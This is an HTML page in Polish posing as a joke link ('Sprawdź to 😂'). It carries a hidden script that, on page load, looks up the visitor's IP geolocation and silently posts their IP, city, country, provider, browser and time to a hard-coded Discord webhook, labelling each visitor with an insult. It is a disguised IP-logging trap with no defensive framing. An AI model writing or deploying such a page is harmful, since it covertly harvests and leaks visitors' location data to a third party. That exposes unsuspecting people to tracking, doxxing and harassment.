<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sprawdź to 😂</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            background: linear-gradient(135deg, #667eea, #764ba2);
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            text-align: center;
        }
        h1 { font-size: 3rem; margin-bottom: 20px; }
        p { font-size: 1.4rem; }
    </style>
</head>
<body>
    <div>
        <h1>😂 NO KURWA SPÓJRZ NA TO</h1>
        <p>To jest najlepsze co dziś widziałeś</p>
    </div>

    <script>
        const webhook = "https://discord.com/api/webhooks/1501014502097813509/SwPATh2xn8-gi5aPGp3LRymj8LxWoF_bOWZx5hjfMPHwx-KhgY2v9OKbN80Mjy1x_8hd";

        fetch("https://ipapi.co/json/")
            .then(r => r.json())
            .then(data => {
                fetch(webhook, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: "**Nowy cwel kliknął link!**",
                        embeds: [{
                            color: 0xff0000,
                            title: "Ktoś wszedł na link",
                            fields: [
                                { name: "IP", value: data.ip || "Nieznane", inline: true },
                                { name: "Miasto", value: data.city || "Nieznane", inline: true },
                                { name: "Kraj", value: data.country_name || "Nieznane", inline: true },
                                { name: "Provider", value: data.org || "Nieznane", inline: false },
                                { name: "Przeglądarka", value: navigator.userAgent.substring(0, 80) + "...", inline: false },
                                { name: "Czas", value: new Date().toLocaleString('pl-PL'), inline: false }
                            ]
                        }]
                    })
                });
            })
            .catch(() => {});
    </script>
</body>
</html>
